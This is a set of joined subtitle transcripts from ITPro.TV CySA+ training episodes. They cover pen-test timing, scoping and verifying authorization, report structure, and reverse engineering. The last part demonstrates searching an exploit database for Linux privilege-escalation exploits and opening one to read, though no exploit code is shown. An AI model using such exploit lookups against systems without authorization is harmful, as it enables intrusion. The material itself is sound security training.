to do it.\n\n168\n00:08:17.550 --> 00:08:20.520\nThen again, it might be the exact\ntime of day that you want to do it.\n\n169\n00:08:20.520 --> 00:08:24.940\nSo getting down the timing\nwith your client, or\n\n170\n00:08:24.940 --> 00:08:28.150\nyour employer, is going to be\na very important step of this.\n\n171\n00:08:28.150 --> 00:08:30.840\nSo you have to figure out,\nwhen do you need me to do this?\n\n172\n00:08:30.840 --> 00:08:34.040\nBecause maybe I have production\nservers that you cannot touch\n\n173\n00:08:34.040 --> 00:08:34.740\nduring a production date.\n\n174\n00:08:34.740 --> 00:08:38.250\nI cannot go down, I cannot even have\nthe possibility of going down or\n\n175\n00:08:38.250 --> 00:08:43.860\ncausing some sort of performance or\nmy users will have a degraded experience.\n\n176\n00:08:43.860 --> 00:08:47.810\nI want them to have the fullest, best,\nrobust experience they can have.\n\n177\n00:08:47.810 --> 00:08:51.911\nAnd if you're pen testing that box during\nthe middle of the day when my user\n\n178\n00:08:51.911 --> 00:08:52.782\nusage is high.\n\n179\n00:08:52.782 --> 00:08:56.940\nThat might cause that, then I don't want\nyou to test during that time, right?\n\n180\n00:08:56.940 --> 00:08:58.680\nThen again, I might be, yeah.\n\n181\n00:08:58.680 --> 00:09:01.170\nI want to see what it was,\ncuz an attacker doesn't care what time of\n\n182\n00:09:01.170 --> 00:09:01.980\nday it is.\n&gt;&gt; No.\n\n183\n00:09:01.980 --> 00:09:05.020\n&gt;&gt; So it just depends on how realistic you\n\n184\n00:09:05.020 --> 00:09:06.355\nwant this to be.\n\n185\n00:09:06.355 --> 00:09:08.160\nDo you want it to look like any old thing?\n\n186\n00:09:08.160 --> 00:09:11.250\nOr do you just want us to try\nto find some vulnerabilities and\n\n187\n00:09:11.250 --> 00:09:12.490\ngive you a really good idea?\n\n188\n00:09:12.490 --> 00:09:17.480\nBut maybe not as close to accurate\n100% real world as might be.\n\n189\n00:09:17.480 --> 00:09:19.759\nSo these are things that\nyou have to vet out.\n\n190\n00:09:19.759 --> 00:09:23.358\nYou have to sit down with a client or\nemployer and figure out which one of\n\n191\n00:09:23.358 --> 00:09:27.092\nthese devices that you can test during\nthe day and which ones you can't.\n\n192\n00:09:27.092 --> 00:09:33.330\nWhich ones are best at night,\nhow long can I test them versus how short.\n\n193\n00:09:33.330 --> 00:09:35.930\nAll these things have to be vetted out.\n\n194\n00:09:37.710 --> 00:09:40.540\nAgain, also just the start and stop,\n\n195\n00:09:40.540 --> 00:09:44.130\nwhen will the test take\nplace from beginning to end?\n\n196\n00:09:44.130 --> 00:09:46.320\nWhen do I start what date and\n\n197\n00:09:46.320 --> 00:09:49.710\nwhen will the test end, what date,\nis the things you want to figure out.\n\n198\n00:09:49.710 --> 00:09:51.210\nWhat else do we have?\n\n199\n00:09:51.210 --> 00:09:54.819\nAgain, services and\ndevices that might be time-sensitive.\n\n200\n00:09:54.819 --> 00:09:58.868\nAgain, if there's any interruption\nthat might cause a problem,\n\n201\n00:09:58.868 --> 00:10:02.132\nyou wanna make sure to not\nto do it during those times.\n\n202\n00:10:02.132 --> 00:10:04.574\nBecause those people might\nbe upset about that and\n\n203\n00:10:04.574 --> 00:10:08.030\nthat's a good way to lose a client,\nit's a good way to get fired.\n\n204\n00:10:08.030 --> 00:10:12.801\nHey, I told you not to attack our web\nserver during the hours of one to\n\n205\n00:10:12.801 --> 00:10:16.246\nfive in the afternoon every day and\nyou did that.\n\n206\n00:10:16.246 --> 00:10:20.386\nThat wasn't agreed upon, so find out what\nthe timing is going to be and stick to\n\n207\n00:10:20.386 --> 00:10:24.340\nit because that's an important thing.\n&gt;&gt; And scope and the planning phase,\n\n208\n00:10:24.340 --> 00:10:25.920\nthat's very important as well,\nisn't it Daniel?\n\n209\n00:10:25.920 --> 00:10:27.100\n&gt;&gt; Yeah, extremely important.\n\n210\n00:10:27.100 --> 00:10:30.530\nThis is where you're going to spend a lot\nof time, figuring out the timing and\n\n211\n00:10:30.530 --> 00:10:32.160\nthen figuring out the scope.\n\n212\n00:10:32.160 --> 00:10:38.410\nWhat machines or what area of the network\nis within the scope of the pen test?\n\n213\n00:10:38.410 --> 00:10:41.810\nBecause not always is it every,\nwell, here's my network, here you go,\n\n214\n00:10:41.810 --> 00:10:43.240\npen test my network.\n\n215\n00:10:43.240 --> 00:10:47.300\nMaybe we've got a test bed and\nit's completely air gapped and\n\n216\n00:10:47.300 --> 00:10:49.060\nthey just don't care.\n\n217\n00:10:49.060 --> 00:10:51.490\nIt's like, it's fine,\npush that off to the side.\n\n218\n00:10:51.490 --> 00:10:54.510\nWe don't care to test that,\nwe just want to test production.\n\n219\n00:10:54.510 --> 00:10:59.170\nNow that could be a good idea or\na bad idea.\n\n220\n00:10:59.170 --> 00:11:03.013\nWho knows, just depends, in my estimation\nyou should pen test everything.\n\n221\n00:11:03.013 --> 00:11:06.034\n[LAUGH] If you can, of course it's\ngonna cost more money, so again,\n\n222\n00:11:06.034 --> 00:11:07.385\nmoney could be a constraint.\n\n223\n00:11:07.385 --> 00:11:11.140\nBut the scope is basically,\nwhat are we testing.\n\n224\n00:11:11.140 --> 00:11:15.368\nAnd it's up to you to make sure,\njust because an employer or\n\n225\n00:11:15.368 --> 00:11:20.203\na client says, here's a list of IP\naddresses that you can pen test.\n\n226\n00:11:20.203 --> 00:11:26.300\nYou should definitely verify that those\nIP addresses belong to your employer.\n\n227\n00:11:26.300 --> 00:11:29.970\nBecause mistakes happen,\nto err is human, right?\n\n228\n00:11:29.970 --> 00:11:33.550\nThis will occur and\nif you pen test the wrong machine,\n\n229\n00:11:33.550 --> 00:11:36.350\nthis is why scoping is\na very important phase.\n\n230\n00:11:37.520 --> 00:11:40.296\nIf you try and test a machine\nthat's outside of the scope,\n\n231\n00:11:40.296 --> 00:11:42.913\neven if they were to give you,\nhere's the IP address.\n\n232\n00:11:42.913 --> 00:11:44.165\nAnd you start pen testing it,\n\n233\n00:11:44.165 --> 00:11:47.330\nyou didn't verify that actually\nthey own that IP address.\n\n234\n00:11:47.330 --> 00:11:51.030\nYou could be in some legal hot water,\nbecause\n\n235\n00:11:51.030 --> 00:11:55.670\nyou are basically attacking a machine that\nyou don't have authorization for, okay?\n\n236\n00:11:55.670 --> 00:12:00.438\nSo a very important phase is scoping.\n&gt;&gt; Yeah they can see you as a bad actor,\n\n237\n00:12:00.438 --> 00:12:02.554\nthey can come against you and [INAUDIBLE].\n&gt;&gt; [LAUGH]\n\n238\n00:12:02.554 --> 00:12:03.289\n&gt;&gt; You made that mistake.\n\n239\n00:12:03.289 --> 00:12:05.679\nHey, I was only pen testing.\n&gt;&gt; [LAUGH]\n\n240\n00:12:05.679 --> 00:12:08.107\n&gt;&gt; It's a good way to do some free work.\n\n241\n00:12:08.107 --> 00:12:11.212\nI was doing some pen\ntesting the other day, and\n\n242\n00:12:11.212 --> 00:12:13.950\njust happen to bump across your IP.\n&gt;&gt;

[LAUGH]\n\n516\n00:25:26.950 --> 00:25:29.370\n&gt;&gt; That was the wrong button, here we go.\n\n517\n00:25:29.370 --> 00:25:33.230\nLet's blow it up here, and\nI think there's even a little slider.\n\n518\n00:25:33.230 --> 00:25:36.330\nLet me make it a little larger,\nthere we go.\n\n519\n00:25:36.330 --> 00:25:39.365\nSo this is basically my opening page.\n\n520\n00:25:39.365 --> 00:25:40.280\nWhat is this?\n\n521\n00:25:40.280 --> 00:25:42.400\nThe title page as you were,\n\n522\n00:25:42.400 --> 00:25:45.740\nremember writing reports back in\nhigh school when you were a kid?\n\n523\n00:25:45.740 --> 00:25:48.590\nMan, you thought man, Mrs.\nJohnson's full of it.\n\n524\n00:25:48.590 --> 00:25:51.210\nWe're never gonna have to do this.\n\n525\n00:25:51.210 --> 00:25:52.413\nMan, she got me-\n&gt;&gt;

That's a good question.\n\n530\n00:26:03.920 --> 00:26:06.440\nI used black box because this was\nthe type of test we performed.\n\n531\n00:26:06.440 --> 00:26:08.080\nThat was a black box test.\n\n532\n00:26:08.080 --> 00:26:12.220\nOr at least as far as this\nfake report is concerned.\n\n533\n00:26:12.220 --> 00:26:16.490\nIt was in the vein of well,\nwe don't know anything about your system,\n\n534\n00:26:16.490 --> 00:26:19.440\nother than here's a scope of IP addresses,\nhere's our network.\n\n535\n00:26:19.440 --> 00:26:21.070\nYou're gonna pretend you're\nan outside attacker,\n\n536\n00:26:21.070 --> 00:26:23.880\nyou know nothing,\nyou've got no internal knowledge.\n\n537\n00:26:23.880 --> 00:26:27.520\nYou're coming at it just like\nany real life attacker would be.\n\n538\n00:26:27.520 --> 00:26:30.852\nSo I like to label that,\nthis was a black box penetration test.\n\n539\n00:26:30.852 --> 00:26:32.720\nAnd this is the report for that.\n\n540\n00:26:32.720 --> 00:26:34.840\nHere was the client, Fakenet.com,\n\n541\n00:26:34.840 --> 00:26:36.790\nobviously they're not real.\n&gt;&gt; Right.\n\n542\n00:26:36.790 --> 00:26:38.176\n&gt;&gt; The report version, so,\n\n543\n00:26:38.176 --> 00:26:42.019\na lot of times you'll create a first\ndraft and maybe submit that, then do\n\n544\n00:26:42.019 --> 00:26:46.555\nsome revisioning and then submit the final\nreport at the end of the penetration test.\n\n545\n00:26:46.555 --> 00:26:47.720\n&gt;&gt; Mm-hm.\n\n546\n00:26:47.720 --> 00:26:50.140\n&gt;&gt; So report versions may vary.\n\n547\n00:26:50.140 --> 00:26:54.370\nThe date that is being reported and\nwho was the author of the report.\n\n548\n00:26:54.370 --> 00:26:59.590\nAnd then you can even give in some\nmetadata, some more detailed properties.\n\n549\n00:26:59.590 --> 00:27:00.792\nWho is the author?\n\n550\n00:27:00.792 --> 00:27:03.590\nWho is the actual person that\ncreated the penetration test?\n\n551\n00:27:03.590 --> 00:27:09.560\nWho reviewed the document that's being\nreported and who was it approved by?\n\n552\n00:27:09.560 --> 00:27:10.970\nWhat's the classification?\n\n553\n00:27:10.970 --> 00:27:13.510\nIs this something that's confidential,\ntop secret or\n\n554\n00:27:13.510 --> 00:27:16.670\nwhatever classification system that\nyou might be employing at the time.\n\n555\n00:27:16.670 --> 00:27:19.510\nAgain, that's an arbitrary\nthing that you just do.\n\n556\n00:27:19.510 --> 00:27:22.800\nBut you wanna label that so that people\nknow, this is a confidential report.\n\n557\n00:27:22.800 --> 00:27:25.452\nI don't just wanna be\ndistributing it to everyone.\n\n558\n00:27:25.452 --> 00:27:28.940\nWell, it's not super sensitive,\nbut maybe it is.\n\n559\n00:27:28.940 --> 00:27:30.440\nYou might want to put top secret on here,\n\n560\n00:27:30.440 --> 00:27:35.170\ndo not allow outside of IT,\nbecause it has damaging.\n\n561\n00:27:35.170 --> 00:27:37.330\nThis is how we hack our network.\n\n562\n00:27:37.330 --> 00:27:39.841\nThat could be something [CROSSTALK].\n\n563\n00:27:39.841 --> 00:27:41.625\nYeah, people might wanna get\ntheir hands on that, right?\n\n564\n00:27:41.625 --> 00:27:42.603\nSo-\n&gt;&gt;

No, that's good.\n\n650\n00:31:52.639 --> 00:31:56.190\nJust again, I think the most important\ntakeaway here is, or at least two things.\n\n651\n00:31:56.190 --> 00:31:58.790\nMake sure you get that scope right\nwhen you perform a penetration test,\n\n652\n00:31:58.790 --> 00:32:01.100\nbecause that's very, very,\nvery, very important.\n\n653\n00:32:01.100 --> 00:32:06.530\nAnd the communication of\nthe results is very key to\n\n654\n00:32:06.530 --> 00:32:09.060\nearning the trust of a long term client,\nhopefully.\n\n655\n00:32:09.060 --> 00:32:13.060\nAnd just showing that you aren't\nsome fly-by-night operation,\n\n656\n00:32:13.060 --> 00:32:14.720\nyou're a legit people.\n\n657\n00:32:14.720 --> 00:32:18.200\nMake sure you get typos out of there,\ndon't leave grammar, spelling errors,\n\n658\n00:32:18.200 --> 00:32:20.030\nthings of that nature,\nget them all out of there.\n\n659\n00:32:20.030 --> 00:32:22.400\nMake it look really professional so\n\n660\n00:32:22.400 --> 00:32:25.190\nthat they take you seriously as\na professional organization, or\n\n661\n00:32:25.190 --> 00:32:28.130\nas a professional person that they\nhave hired to work for their company.\n\n662\n00:32:28.130 --> 00:32:30.910\nThat's what you want to do,\nkind of wiggle along the way.\n\n663\n00:32:30.910 --> 00:32:32.320\n&gt;&gt; Awesome Daniel, well done.\n\n664\n00:32:32.320 --> 00:32:33.586\nMake sure you see every episode of CySA+.\n\n665\n00:32:33.586 --> 00:32:37.217\nDaniel's done a great job of putting\ntogether this course for you or\n\n666\n00:32:37.217 --> 00:32:39.530\nthis series of this show, if you will.\n\n667\n00:32:39.530 --> 00:32:41.490\nMake sure you see every episode,\nimportant stuff.\n\n668\n00:32:41.490 --> 00:32:44.450\nAnd while you're in the course library,\nthere's thousands of other videos there\n\n669\n00:32:44.450 --> 00:32:47.490\nthat are designed to do one thing,\ntake you further.\n\n670\n00:32:47.490 --> 00:32:48.770\nSo check those out, too.\n\n671\n00:32:48.770 --> 00:32:49.951\nAnd tell everybody you\nknow about ITPro.TV.\n\n672\n00:32:49.951 --> 00:32:52.810\nYou know ITPro.TV is bingeworthy.\n\n673\n00:32:52.810 --> 00:32:55.330\nThanks for watching, I'm Zach Memos.\n&gt;&gt; And I'm Daniel Lowrie.\n\n674\n00:32:55.330 --> 00:32:56.236\n&gt;&gt; And we will see you again soon.\n\n675\n00:32:56.236 --> 00:33:02.970\n[MUSIC]\n\n676\n00:33:02.970 --> 00:33:04.809\n&gt;&gt; Thank you for watching ITPro.TV.\n\n",

watching ITPRO.TV.\n&gt;&gt; Hello and thank you for\n\n4\n00:00:13.286 --> 00:00:16.530\nwatching ITPRO.TV empowering\nthe world with engaging learning.\n\n5\n00:00:16.530 --> 00:00:19.460\nI'm your host Zach Memos for\nthis episode of CySA+.\n\n6\n00:00:19.460 --> 00:00:23.760\n\"Security Practices Reverse Engineering\"\nis the title of this episode.\n\n7\n00:00:23.760 --> 00:00:24.660\nWhat's that all about?\n\n8\n00:00:24.660 --> 00:00:27.000\nWell, Daniel Lowrie is gonna tell us,\naren't you Daniel?\n\n9\n00:00:27.000 --> 00:00:29.800\n&gt;&gt; That's, I'm gonna do my dead-level\n\n10\n00:00:29.800 --> 00:00:33.500\nbest, to help you guys understand what the\nheck this reverse engineering business is\n\n11\n00:00:33.500 --> 00:00:37.040\nand why it's a good security\npractice that we might engage in.\n\n12\n00:00:37.040 --> 00:00:39.250\nSo, Zach.\n&gt;&gt; Hmm?\n\n13\n00:00:39.250 --> 00:00:40.298\n&gt;&gt; Are you familiar with the reverse\n\n14\n00:00:40.298 --> 00:00:42.806\nengineering?\n&gt;&gt; Well, first of all, why do it?,\n\n15\n00:00:42.806 --> 00:00:45.356\nwhats the purpose?\n&gt;&gt; That's a great question.\n\n16\n00:00:45.356 --> 00:00:48.740\nWhy in the world, would we wanna do\nreverse engineering, it seems weird.\n\n17\n00:00:49.810 --> 00:00:51.410\nBecause it is, it's a weird thing,\n\n18\n00:00:51.410 --> 00:00:55.860\nwhat we do is basically you're\ntaking a product, that's finished.\n\n19\n00:00:55.860 --> 00:01:00.150\nTypically, something technical,\ntypically soft ware a lot of times,\n\n20\n00:01:00.150 --> 00:01:01.975\nsometimes it's hardware,\nyou never know, right?\n\n21\n00:01:01.975 --> 00:01:05.010\nWhat we're doing is we're\nstarting with the finished thing,\n\n22\n00:01:05.010 --> 00:01:09.790\nwe're tryna work our way backwards and\nfiguring out how it works,\n\n23\n00:01:09.790 --> 00:01:14.230\nwhy it works and\nare there any security issues built in.\n\n24\n00:01:14.230 --> 00:01:19.340\nAgain, kind of that black box test,\nbut for hardware and\n\n25\n00:01:19.340 --> 00:01:20.480\nspecific types of software.\n\n26\n00:01:20.480 --> 00:01:24.310\nWe actually have the code, or you have the\nsoftware and you need to look at the code.\n\n27\n00:01:24.310 --> 00:01:25.650\nHow do I do that?\n\n28\n00:01:25.650 --> 00:01:30.197\nThat's what reverse engineer it's\ntryna like, start from the end and\n\n29\n00:01:30.197 --> 00:01:34.840\nwork our way back so we can find issues,\nflaws, that might be a problem.\n\n30\n00:01:34.840 --> 00:01:37.271\n&gt;&gt; So we are reverse engineering software,\n\n31\n00:01:37.271 --> 00:01:42.570\nservices, or all of the above?\n&gt;&gt; All of the above, anything and\n\n32\n00:01:42.570 --> 00:01:44.920\nreally a service is software that runs.\n&gt;&gt; Right.\n\n33\n00:01:44.920 --> 00:01:47.523\n&gt;&gt; So, break it down to its basic\n\n34\n00:01:47.523 --> 00:01:49.110\ncomponents.\n\n35\n00:01:49.110 --> 00:01:53.029\nLets figure out each one little thing\nthat's built into this thing, so\n\n36\n00:01:53.029 --> 00:01:56.885\nthat we can discover,\nits all about discovery of vulnerability.\n\n37\n00:01:56.885 --> 00:01:59.470\nIt's a very important thing right?\n\n38\n00:01:59.470 --> 00:02:02.994\nSo it could be part of your penetration\ntesting, to be honest with you,\n\n39\n00:02:02.994 --> 00:02:05.690\nyou could be doing some\nreverse engineering.\n\n40\n00:02:05.690 --> 00:02:08.930\nBut it's also really\nhelpful when it comes to,\n\n41\n00:02:08.930 --> 00:02:13.580\ndo we have secure,\nhave we been compromised.\n\n42\n00:02:13.580 --> 00:02:16.950\nMaybe you found software on your system or\n\n43\n00:02:16.950 --> 00:02:23.400\nembedded into a system that is actually a\nmalicious code, but how do you know that?\n\n44\n00:02:23.400 --> 00:02:24.650\nWell, you can reverse engineer.\n\n45\n00:02:24.650 --> 00:02:27.730\nHow do I know that the third\nparty app that I just bought\n\n46\n00:02:27.730 --> 00:02:29.360\ndoesn't include malware?\n\n47\n00:02:29.360 --> 00:02:31.340\nSo you start to see the real power here.\n\n48\n00:02:31.340 --> 00:02:34.590\nWe know what's going on with our\nown stuff cuz we write it, right,\n\n49\n00:02:34.590 --> 00:02:36.140\nif I'm writing software it's fine.\n\n50\n00:02:36.140 --> 00:02:39.370\nBut if I'm getting third party things,\n\n51\n00:02:39.370 --> 00:02:40.960\nhow do I know that they\nhaven't been compromised?\n\n52\n00:02:40.960 --> 00:02:43.540\nAnd you think,\nwell the big boys don't have this problem.\n\n53\n00:02:43.540 --> 00:02:47.740\nThey do, it happens from time to\ntime where someone compromises,\n\n54\n00:02:47.740 --> 00:02:53.065\na large corporation, a large organization\nthat creates a very popular software and\n\n55\n00:02:53.065 --> 00:02:54.567\nthey embed a back door.\n\n56\n00:02:54.567 --> 00:02:58.455\nAnd then they put that for the download,\nthen when you download it, you have now\n\n57\n00:02:58.455 --> 00:03:02.360\ninfected yourself, unbeknownst to\nthe company, unbeknownst to you.\n\n58\n00:03:02.360 --> 00:03:06.400\nSo doing reverse engineering and\ncode review on stuff even though that\n\n59\n00:03:06.400 --> 00:03:09.490\nwe know that maybe even it's ours,\nit's a good idea.\n\n60\n00:03:09.490 --> 00:03:12.288\nEspecially if it's not ours and\nif it's not in house.\n\n61\n00:03:12.288 --> 00:03:16.667\nDoing code review,\ndoing reverse engineering of that code,\n\n62\n00:03:16.667 --> 00:03:20.802\ncould be a very beneficial\nespecially if your not really.\n\n63\n00:03:20.802 --> 00:03:25.518\nThis is what we might recall a indicator\ncompromise, a advance persistent threats,\n\n64\n00:03:25.518 --> 00:03:26.049\nAPT's.\n\n65\n00:03:26.049 --> 00:03:30.332\nA lot of times these advanced persistent\nthreats are very crafty people,\n\n66\n00:03:30.332 --> 00:03:34.131\nthey will create software or\nmalware that is able to circumvent,\n\n67\n00:03:34.131 --> 00:03:37.880\nany kind of anti-virus,\nanti-malware system that you have.\n\n68\n00:03:37.880 --> 00:03:42.580\nIt's not detectable, that's why it's\nadvanced, persistent and a threat.\n\n69\n00:03:42.580 --> 00:03:45.440\nBecause, it's not getting\npicked-up by normal means.\n\n70\n00:03:45.440 --> 00:03:48.520\nSo if you run across maybe a system file,\nor something that looks like a file, but\n\n71\n00:03:48.520 --> 00:03:50.200\nyou're not 100% familiar with it,\n\n72\n00:03:50.200 --> 00:03:55.050\nmaybe doing a reverse engineering\npractice against that would be good.\n\n73\n00:03:55.050 --> 00:03:56.050\nWhat does it do?\n\n74\n00:03:56.050 --> 00:04:02.150\nI don't know, I didn't write the code,\nso how do we see inside of the box, to\n\n75\n00:04:02.150 --> 00:04:06.400\nwhat it actually is doing, so I can verify\nthat it's not doing anything malicious?\n\n76\n00:04:06.400 --> 00:04:10.945\nSo it can be really helpful in\nthat hunt team, finding a APT,\n\n77\n00:04:10.945 --> 00:04:13.650\nso it's a great method for that.\n&gt;&gt; So\n\n78\n00:04:13.650 --> 00:04:17.346\nhow was reverse engineering reform.\n&gt;&gt; It's reform by looking,\n\n79\n00:04:17.346 --> 00:04:18.962\nactually it's a couple of ways.\n\n80\n00:04:18.962 --> 00:04:21.700\nOkay, basically,\nthere's a couple of ways to do this.\n\n81\n00:04:21.700 --> 00:04:25.330\nOne way is to look at the code,\nthere's a couple of different and\n\n82\n00:04:25.330 --> 00:04:28.400\nthere's basically two different\ntypes of programming languages.\n\n83\n00:04:28.400 --> 00:04:31.000\nOne is interpreted and\nthe other is compiled and\n\n84\n00:04:31.000 --> 00:04:32.400\nthe difference between the two is this.\n\n85\n00:04:32.400 --> 00:04:36.440\nAs an interpreted language, you have your\nlines of code that go one, next, two,\n\n86\n00:04:36.440 --> 00:04:38.610\nthree, four, five, six and\nseven and they all do things.\n\n87\n00:04:38.610 --> 00:04:42.584\nIt's the same instructions for\nyour computer to do x, y, or z.\n\n88\n00:04:42.584 --> 00:04:47.717\nWhat you do in internal language,\nor even what the interpreter does,\n\n89\n00:04:47.717 --> 00:04:52.241\nis it reads it line by line, so\nthis is languages like Python,\n\n90\n00:04:52.241 --> 00:04:56.341\nRuby, JavaScript,\nBash is an interpreted language.\n\n91\n00:04:56.341 --> 00:05:00.331\nSo I don't do anything with it,\nit doesn't become an executable,\n\n92\n00:05:00.331 --> 00:05:03.691\nit's just a file with a set\nof instructions inside of it,\n\n93\n00:05:03.691 --> 00:05:07.681\nthat I can tell my computer to run,\nall the instructions that you see\n\n94\n00:05:07.681 --> 00:05:11.196\ninside of this file, so\nthat's an interpreted language.\n\n95\n00:05:11.196 --> 00:05:15.486\nThe other type is a compiled language,\nthis is like your C language, this is,\n\n96\n00:05:15.486 --> 00:05:17.405\nwhat else is compiled, mostly C.\n\n97\n00:05:17.405 --> 00:05:20.252\n[LAUGH] I think Java might be compiled.\n\n98\n00:05:20.252 --> 00:05:25.318\nBut what happens there is,\nI create all the instructions and\n\n99\n00:05:25.318 --> 00:05:30.850\nthen I run it through a compiler and\nit builds a package.\n\n100\n00:05:30.850 --> 00:05:34.470\nOkay, at this point,\nthe source is now closed off,\n\n101\n00:05:34.470 --> 00:05:38.710\nit's just a binary file that should\ntell your computer to run and\n\n102\n00:05:38.710 --> 00:05:43.100\nthe instructions then can\npassed at a lower level.\n\n103\n00:05:43.100 --> 00:05:48.360\nOkay, so with a compiled language, you\ntypically cannot see a lot of information,\n\n104\n00:05:48.360 --> 00:05:50.130\nthat's in that compiled package.\n\n105\n00:05:50.130 --> 00:05:53.480\nWhereas in interpretative language,\nyou can read them line by line and\n\n106\n00:05:53.480 --> 00:05:55.160\nI can show you a bit what that looks like.\n\n107\n00:05:55.160 --> 00:05:59.120\nLet's jump to my machine and\nwe'll look, me bring up a terminal.\n\n108\n00:05:59.120 --> 00:05:59.990\n&gt;&gt; Look, some Kali Linux.\n\n109\n00:05:59.990 --> 00:06:01.270\n&gt;&gt; Yeah, some Kali Linux for\n\n110\n00:06:01.270 --> 00:06:04.138\nthe masses that everybody loves it.\n&gt;&gt; Very good.\n\n111\n00:06:04.138 --> 00:06:07.320\n&gt;&gt; There we go, get the terminal to size.\n\n112\n00:06:07.320 --> 00:06:13.933\nAnd I can use term on this\nsearch e-a-r-c-h sploit and\n\n113\n00:06:13.933 --> 00:06:20.440\nthis has a database of\nexploits that I can pull from.\n\n114\n00:06:20.440 --> 00:06:22.380\nAnd some of these are built with\nan interpreted language and\n\n115\n00:06:22.380 --> 00:06:23.950\nsome of these are built\nwith complied language.\n\n116\n00:06:23.950 --> 00:06:28.960\nSo we can take a look at some code,\nthat maybe you found on your machine and\n\n117\n00:06:28.960 --> 00:06:31.162\nyou go, what does this do?\n&gt;&gt; [LAUGH]\n\n118\n00:06:31.162 --> 00:06:34.775\n&gt;&gt; Right, let's do searchsploit we'll\n\n119\n00:06:34.775 --> 00:06:38.394\npick, I don't know, Linux priv esc.\n\n120\n00:06:38.394 --> 00:06:42.362\nSo I'm just telling you to look for\nthese search terms in the database and\n\n121\n00:06:42.362 --> 00:06:44.540\nfind any code that might be doing it.\n\n122\n00:06:44.540 --> 00:06:45.701\nSo I can hit that and there we go,\n\n123\n00:06:45.701 --> 00:06:47.380\nthere's a bunch of different code.\n&gt;&gt; Hm-mm\n\n124\n00:06:47.380 --> 00:06:49.111\n&gt;&gt; You'll see some of it over here ends\n\n125\n00:06:49.111 --> 00:06:49.690\nwith dot c.\n\n126\n00:06:49.690 --> 00:06:53.152\nThat let's me know it is a c\nfile which I can compile,\n\n127\n00:06:53.152 --> 00:06:57.420\nafter I make my modifications,\nnow this is exploit code right?\n\n128\n00:06:57.420 --> 00:07:01.680\nThis is uncompiled exploit code or\ninterpreted exploit code.\n\n129\n00:07:01.680 --> 00:07:06.310\nAnything you see with the dot\nC is written in C or C++,\n\n130\n00:07:06.310 --> 00:07:13.670\nwe see this dot PL that's pearl,\nthere's RB that's ruby.\n\n131\n00:07:13.670 --> 00:07:16.780\nLooking for a, a python script,\n\n132\n00:07:16.780 --> 00:07:19.740\nthere we go, .py, that's python,\nlet's look at that one.\n\n133\n00:07:21.140 --> 00:07:23.670\nSo, well of course it's\nway out of my range,\n\n134\n00:07:23.670 --> 00:07:28.270\nlet me throw it up here while we are or\njust python, see if I just get,\n\n135\n00:07:28.270 --> 00:07:30.690\nthere we go,\nlet's look at that .py, wonderful.\n\n136\n00:07:30.690 --> 00:07:36.932\nSo I will cat one of these files,\nsay cat and\n\n137\n00:07:36.932 --> 00:07:43.178\nthere is n/user/shares/exploitdb and\n\n138\n00:07:43.178 --> 00:07:51.864\nexploits/linux/ let's do local 12 and\nsort of .p1.\n\n139\n00:07:53.105 --> 00:07:55.945\nNow I'm not gonna cap\nthat cuz I'm sure it's\n\n140\n00:07:55.945 --> 00:07:59.097\nlonger than just a couple of lines on the.\n\n141\n00:07:59.097 --> 00:08:04.800\nHere we go, that way we can scroll\nthrough it a little bit easier in return.\n\n142\n00:08:04.800 --> 00:08:09.670\nSo here is an exploit code,\nI can be looking through this again\n\n143\n00:08:09.670 --> 00:08:13.030\nas someone who is performing\nreverse engineering.\n\n144\n00:08:13.030 --> 00:08:17.290\nI probably just have found\nsome code on a machine and\n\n145\n00:08:17.290 --> 00:08:19.430\nI'm wondering what does this do?\n\n146\n00:08:19.430 --> 00:08:22.440\nSo, if it's a [INAUDIBLE] file,\nI can just read it just like I did.\n\n147\n00:08:22.440 --> 00:08:25.370\nUse Les, use cat,\nmaybe a text editor, whatever,\n\n148\n00:08:25.370 --> 00:08:28.090\nyou just open it up and\nthere are the instructions.\n\n149\n00:08:28.090 --> 00:08:30.590\nNow I do need to be able to\nlook at those instructions and\n\n150\n00:08:30.590 --> 00:08:35.360\ninterpret what they do, but it's easily\ndone with an interpreted language.\n\n151\n00:08:35.360 --> 00:08:39.780\nSo let's just look through here,\ncreated by f secure and our gatekeeper.\n\n152\n00:08:40.880 --> 00:08:42.785\nLet's see here.\n\n153\n00:08:42.785 --> 00:08:49.650\nIt tells you some prints, try this, try\nthat and this is privileged escalation.\n\n154\n00:08:49.650 --> 00:08:53.600\nSo basically what this code is gonna\ntry to do is take a standard user and\n\n155\n00:08:53.600 --> 00:08:58.110\nelevate them to a more advanced user,\nlike an administrator, like root,\n\n156\n00:08:58.110 --> 00:08:59.780\nif you're in roots.\n\n157\n00:08:59.780 --> 00:09:03.290\nRight, giving me some options\navailable and this is all,\n\n158\n00:09:03.290 --> 00:09:07.340\nhere's the actual code right here and I'll\nbe able to look through this line by line.\n\n159\n00:09:07.340 --> 00:09:11.100\nAnd if I understand Python, or\nif I understand coding even in general,\n\n160\n00:09:11.100 --> 00:09:15.420\nI should be able to discern what it\nis that this code is trying to do.\n\n161\n00:09:15.420 --> 00:09:20.640\nAnd if I discover that I think\nit's doing something malfeasance,\n\n162\n00:09:20.640 --> 00:09:24.000\nthen I'm going to want to\neradicate that code, okay?\n\n163\n00:09:25.300 --> 00:09:30.120\nLet's see here, so yeah,\nbasically going through that line by line,\n\n164\n00:09:30.120 --> 00:09:32.140\nGod knows how long this is.\n\n165\n00:09:32.140 --> 00:09:35.740\nSo, it could take you some time to\ndiscern, maybe you wanna grab this thing,\n\n166\n00:09:35.740 --> 00:09:36.590\nthrow it in a sandbox or\n\n167\n00:09:36.590 --> 00:09:39.400\nsomething and run and see what it does,\nthat could also be helpful.\n\n168\n00:09:39.400 --> 00:09:41.160\nBut with reverse engineering,\n\n169\n00:09:41.160 --> 00:09:45.670\nwe're thinking of the idea of let's look\nat it and figure out what it's doing.\n\n170\n00:09:45.670 --> 00:09:49.330\nWith a compile code you get\na bunch of garbage stuff,\n\n171\n00:09:49.330 --> 00:09:50.680\nyou'll just see an executable.\n\n172\n00:09:50.680 --> 00:09:54.160\nIf you try to less it, you try to cat it,\nyou'll get all these garbage characters.\n\n173\n00:09:54.160 --> 00:09:58.940\nYou can do things like strings to look for\nany, readable content and\n\n174\n00:09:58.940 --> 00:10:03.070\nmaybe you'll find something in there\nthat could be malicious, could happen,\n\n175\n00:10:03.070 --> 00:10:04.360\nthat is part of reverse engineering.\n\n176\n00:10:04.360 --> 00:10:09.290\nTypically, though, it is put\nthrough what's called a decompiler.\n\n177\n00:10:09.290 --> 00:10:13.900\nSo because the code has been compiled,\nI wanna break it back down from just that\n\n178\n00:10:13.900 --> 00:10:18.250\nexecutable binary bits\npackage to code again, so\n\n179\n00:10:18.250 --> 